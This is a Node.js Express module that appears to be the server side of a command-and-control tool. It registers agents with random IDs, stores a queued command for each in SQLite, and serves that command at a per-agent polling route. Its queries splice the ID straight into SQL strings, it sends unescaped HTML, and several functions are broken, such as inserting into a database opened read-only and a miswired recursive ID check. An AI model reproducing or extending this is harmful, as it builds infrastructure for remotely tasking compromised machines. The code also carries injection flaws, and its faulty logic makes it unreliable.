const express = require("express");
const path = require("path");
const sqlite3 = require("sqlite3").verbose();
var crypto = require('crypto');
const bodyParser = require("body-parser");
const cookieParser = require("cookie-parser");
const sessions = require('express-session');
const { resolve } = require("path");

module.exports = {
    create_agentid: function (ids){
        let id = (Math.random() + 1).toString(36).substring(2);
        for (let i = 0; i < ids.length; i++) {
            if (id === ids[i]){
                create_agentid(ids)
            }
        }
        ids.push(id);
        init_session(id);
        return { 'ids': ids, 'id': id }
    },
    add_route: async function (app, id) {
        // wrap with auth to prevent arbitary collection of commands
        app.get("/id/"+id, (req, res) => {
            get_cmd(id, res)
        })
        return app;
    }
};


function create_session (id){
    let db = new sqlite3.Database(path.join(__dirname, '../main.db'), sqlite3.OPEN_READONLY);
    return new Promise((resolve, reject) =>
      db.each("INSERT INTO sessions (id, command, active, last_checkin) VALUES (\'"+id+"\', \'nop\', 0, \'00/00/00 00:00:00\')", [], (err, row) => {
          resolve('inserted')
          return
      }, () => reject())
    )
}

// session creation failing
async function init_session (id){
    try {
      const sess = await create_session(id);
      return sess
    } catch {
      console.log("sess creation falied failed...")
      return -1
    }
  }


function collect_cmd (id){
    let db = new sqlite3.Database(path.join(__dirname, '../main.db'), sqlite3.OPEN_READONLY);
    return new Promise((resolve, reject) =>
      db.each("SELECT command FROM sessions WHERE id = \'"+id+"\'", [], (err, row) => {
          resolve(row.command)
          return
      }, () => reject())
    )
}

async function get_cmd(id, res){
    try {
        const cmd = await collect_cmd(id);
        res.send("<p>" + cmd + "</p>")
        return cmd
      } catch {
        console.log("cmd failed...")
        return -1
    }
}

